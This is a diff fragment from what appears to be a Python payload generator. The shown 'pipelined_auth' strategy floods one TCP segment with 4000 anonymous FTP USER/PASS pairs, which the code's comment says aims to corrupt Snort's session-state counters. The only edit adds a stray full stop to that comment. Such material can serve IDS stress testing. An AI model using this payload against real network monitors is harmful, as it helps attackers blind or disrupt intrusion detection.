@@ -56,7 +56,7 @@ def build_ftp_payload(strategy: str) -> bytes:
     elif strategy == "pipelined_auth":
         # Pipeline thousands of USER/PASS pairs in one TCP segment.
         # Forces Snort's auth-state machine through rapid transitions which
-        # can corrupt its internal session-state counters.
+        # can corrupt its internal session-state counters..
         pair = b"USER anonymous\r\nPASS anonymous@test.com\r\n"
         return pair * 4000
 
